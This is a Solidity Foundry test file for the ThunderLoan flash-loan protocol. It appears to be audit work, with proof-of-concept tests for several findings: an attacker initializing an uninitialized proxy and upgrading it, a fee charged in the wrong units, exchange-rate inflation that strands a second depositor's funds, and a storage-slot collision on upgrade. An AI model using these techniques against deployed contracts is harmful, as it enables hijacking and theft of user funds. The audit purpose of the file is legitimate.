// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console, console2 } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
import { MockPoolFactory } from "../mocks/MockPoolFactory.sol";
import { MockTSwapPool } from "../mocks/MockTSwapPool.sol";
import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(address(thunderLoan.getAssetFromToken(tokenA)), address(assetToken));
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
    }

    // the L-1: the deploy script never calls initialize, so anyone can initialize the proxy,
    // become the owner and replace the implementation
    function test_AnyoneCanInitializeProxy_AUDIT() public {
        // exactly what script/DeployThunderLoan.s.sol does, no initialize call
        ThunderLoan implementation = new ThunderLoan();
        ERC1967Proxy freshProxy = new ERC1967Proxy(address(implementation), "");
        ThunderLoan uninitializedProxy = ThunderLoan(address(freshProxy));

        // the proxy is live, but it has no owner and no pool factory
        console.log("owner before:", uninitializedProxy.owner());
        console.log("pool factory before:", uninitializedProxy.getPoolFactoryAddress());
        assertEq(uninitializedProxy.owner(), address(0));
        assertEq(uninitializedProxy.getPoolFactoryAddress(), address(0));

        // an attacker initializes it first and becomes the owner
        address attacker = makeAddr("attacker");
        MockPoolFactory attackerFactory = new MockPoolFactory();

        vm.prank(attacker);
        uninitializedProxy.initialize(address(attackerFactory));

        console.log("owner after:", uninitializedProxy.owner());
        assertEq(uninitializedProxy.owner(), attacker);
        assertEq(
            uninitializedProxy.getPoolFactoryAddress(),
            address(attackerFactory)
        );

        // the deployer can never take it back, the initializer is spent
        vm.expectRevert();
        uninitializedProxy.initialize(address(mockPoolFactory));

        // and the attacker owns every onlyOwner function, the fee for example
        vm.prank(attacker);
        uninitializedProxy.updateFlashLoanFee(1e18);
        console2.log("fee set by attacker:", uninitializedProxy.getFee());
        assertEq(uninitializedProxy.getFee(), 1e18);

        // the owner is also the upgrade authority, so the implementation can be replaced
        ThunderLoan maliciousImplementation = new ThunderLoan();
        vm.prank(attacker);
        uninitializedProxy.upgradeToAndCall(address(maliciousImplementation), "");

        bytes32 implementationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        address newImplementation = address(
            uint160(uint256(vm.load(address(freshProxy), implementationSlot)))
        );
        console.log("implementation after attacker upgrade:", newImplementation);
        assertEq(newImplementation, address(maliciousImplementation));
    }

    // the H-1: getCalculatedFee returns the fee in WETH value, but flashloan expects it in token units
    function test_CalculatedFeeIsDenominatedInWeth_AUDIT() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT;

        // the mock pool hardcodes a price of 1e18, which hides the bug, so set a real one:
        // this token is worth 0.01 WETH, not 1 WETH
        uint256 price = 0.01e18;
        MockTSwapPool pool = MockTSwapPool(mockPoolFactory.getPool(address(tokenA)));
        vm.mockCall(
            address(pool),
            abi.encodeWithSelector(MockTSwapPool.getPriceOfOnePoolTokenInWeth.selector),
            abi.encode(price)
        );

        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        // the fee should be 0.3% of the borrowed token amount
        uint256 intendedFee = (amountToBorrow * thunderLoan.getFee()) / thunderLoan.getFeePrecision();

        // instead it is 0.3% of the WETH value, treated as if it were tokens
        uint256 valueInWeth = (amountToBorrow * price) / thunderLoan.getFeePrecision();
        uint256 wronglyDenominatedFee = (valueInWeth * thunderLoan.getFee()) / thunderLoan.getFeePrecision();

        console2.log("intended fee in token units:", intendedFee);
        console2.log("fee the contract charges:", fee);
        assertEq(fee, wronglyDenominatedFee);
        assertEq(fee, intendedFee / 100);

        // and the protocol really accepts this reduced fee on a real flash loan
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);
        console2.log("asset token balance after the loan:", tokenA.balanceOf(address(assetToken)));
        console2.log("receiver paid in fees:", AMOUNT - mockFlashLoanReceiver.getBalanceAfter());

        // the pool grew by the wrongly denominated fee, not by the intended one
        assertEq(
            tokenA.balanceOf(address(assetToken)),
            DEPOSIT_AMOUNT + fee
        );
        assertEq(AMOUNT - mockFlashLoanReceiver.getBalanceAfter(), fee);
        assertLt(fee, intendedFee);
    }

    // the H-2: deposit charges itself a flash loan fee that was never paid and adds it to the
    // exchange rate, so a plain deposit with no loan in the transaction inflates the rate
    function test_DepositChargesItsOwnFee_AUDIT() public setAllowedToken {
        uint256 depositAmount = 100e18;
        AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);

        uint256 rateBefore = assetToken.getExchangeRate();

        tokenA.mint(liquidityProvider, depositAmount);
        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), depositAmount);
        thunderLoan.deposit(tokenA, depositAmount);
        vm.stopPrank();

        uint256 rateAfter = assetToken.getExchangeRate();
        uint256 minted = assetToken.totalSupply();
        uint256 held = tokenA.balanceOf(address(assetToken));
        uint256 redeemable = (minted * rateAfter) /
            assetToken.EXCHANGE_RATE_PRECISION();

        console2.log("exchange rate before:", rateBefore);
        console2.log("exchange rate after a plain deposit:", rateAfter);
        console2.log("asset tokens minted:", minted);
        console2.log("underlying held by the pool:", held);
        console2.log("underlying redeemable at the new rate:", redeemable);

        // no flash loan happened, so the rate should never have moved
        assertEq(rateBefore, 1e18);
        assertGt(rateAfter, rateBefore);

        // and the protocol already owes more underlying than it holds
        assertGt(redeemable, held);
    }

    // the H-2 impact: the inflation is credited to whoever deposited first, so the first
    // depositor redeems more than they put in and the next depositor cannot exit
    function test_DepositExchangeRateInflationStealsFromNextDepositor_AUDIT()
        public
        setAllowedToken
    {
        uint256 depositAmount = 100e18;
        AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);
        address victim = makeAddr("victim");

        // first depositor
        tokenA.mint(liquidityProvider, depositAmount);
        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), depositAmount);
        thunderLoan.deposit(tokenA, depositAmount);
        vm.stopPrank();

        // an honest second depositor puts in the same amount
        tokenA.mint(victim, depositAmount);
        vm.startPrank(victim);
        tokenA.approve(address(thunderLoan), depositAmount);
        thunderLoan.deposit(tokenA, depositAmount);
        vm.stopPrank();

        uint256 victimAssetTokens = assetToken.balanceOf(victim);
        uint256 rate = assetToken.getExchangeRate();
        uint256 victimRedeemable = (victimAssetTokens * rate) /
            assetToken.EXCHANGE_RATE_PRECISION();

        // the first depositor exits with everything
        // (read the balance first, a call inside the args would eat the prank)
        uint256 firstDepositorAssetTokens = assetToken.balanceOf(
            liquidityProvider
        );
        vm.prank(liquidityProvider);
        thunderLoan.redeem(tokenA, firstDepositorAssetTokens);

        uint256 firstDepositorOut = tokenA.balanceOf(liquidityProvider);
        uint256 leftForVictim = tokenA.balanceOf(address(assetToken));

        console2.log("first depositor put in:", depositAmount);
        console2.log("first depositor took out:", firstDepositorOut);
        console2.log(
            "first depositor profit:",
            firstDepositorOut - depositAmount
        );
        console2.log("victim asset tokens:", victimAssetTokens);
        console2.log("victim redeemable at the rate:", victimRedeemable);
        console2.log("underlying left for the victim:", leftForVictim);

        // the first depositor made a profit with no risk
        assertGt(firstDepositorOut, depositAmount);

        // the victim cannot redeem what the exchange rate promises them
        assertLt(leftForVictim, victimRedeemable);

        // their own redeem reverts, the deposit is stuck behind the inflated rate
        vm.prank(victim);
        vm.expectRevert();
        thunderLoan.redeem(tokenA, type(uint256).max);
    }

    // the M-1: ThunderLoanUpgraded drops s_feePrecision as a storage variable, so every
    // variable declared after it shifts up one slot and s_flashLoanFee inherits the old 1e18
    function test_UpgradeShiftsFeeToHundredPercent_AUDIT() public setAllowedToken {
        uint256 feeBefore = thunderLoan.getFee();
        assertEq(feeBefore, 3e15);

        // upgrade the same proxy to the contract the upgradedProtocol folder exists for
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgraded), "");

        // s_flashLoanFee now reads the slot that used to hold s_feePrecision, which was 1e18
        uint256 feeAfter = ThunderLoanUpgraded(address(proxy)).getFee();
        console2.log("fee before the upgrade:", feeBefore);
        console2.log("fee after the upgrade:", feeAfter);

        assertEq(feeAfter, 1e18);
        assertGt(feeAfter, feeBefore);

        // and it really charges 100%: a 100e18 loan is charged a 100e18 fee
        uint256 amountToBorrow = 100e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        console2.log("fee charged on a 100e18 loan:", fee);
        assertEq(fee, amountToBorrow);
    }
}
